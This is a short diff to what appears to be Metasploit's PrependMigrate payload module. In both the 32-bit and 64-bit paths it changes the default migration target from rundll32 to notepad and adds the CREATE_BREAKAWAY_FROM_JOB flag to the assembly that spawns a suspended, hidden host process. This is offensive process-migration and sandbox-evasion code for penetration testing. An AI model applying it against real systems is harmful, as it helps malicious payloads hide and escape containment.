@@ -57,7 +57,7 @@ module Msf::Payload::Windows::PrependMigrate
   #
   def prepend_migrate(buf)
     payloadsize = "0x%04x" % buf.length
-    procname = datastore['PrependMigrateProc'] || 'rundll32'
+    procname = datastore['PrependMigrateProc'] || 'notepad'
 
     # Prepare instructions to get address of block_api into ebp
     block_api_start = <<-EOS
@@ -221,7 +221,7 @@ module Msf::Payload::Windows::PrependMigrate
       xor ebx,ebx
       push ebx                  ; lpCurrentDirectory
       push ebx                  ; lpEnvironment
-      push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
+      push 0x09000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED | CREATE_BREAKAWAY_FROM_JOB
       push ebx                  ; bInHeritHandles
       push ebx                  ; lpThreadAttributes
       push ebx                  ; lpProcessAttributes
@@ -300,7 +300,7 @@ module Msf::Payload::Windows::PrependMigrate
 
   def prepend_migrate_64(buf)
     payloadsize = "0x%04x" % buf.length
-    procname = datastore['PrependMigrateProc'] || 'rundll32'
+    procname = datastore['PrependMigrateProc'] || 'notepad'
 
     # Prepare instructions to get address of block_api into ebp
     block_api_start = <<-EOS
@@ -467,7 +467,7 @@ module Msf::Payload::Windows::PrependMigrate
       xor rcx,rcx
       push rcx                  ; lpCurrentDirectory
       push rcx                  ; lpEnvironment
-      push 0x08000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED
+      push 0x09000004           ; dwCreationFlags CREATE_NO_WINDOW | CREATE_SUSPENDED | CREATE_BREAKAWAY_FROM_JOB
       push rcx                  ; bInHeritHandles
       mov r9, rcx               ; lpThreadAttributes
       mov r8, rcx               ; lpProcessAttributes
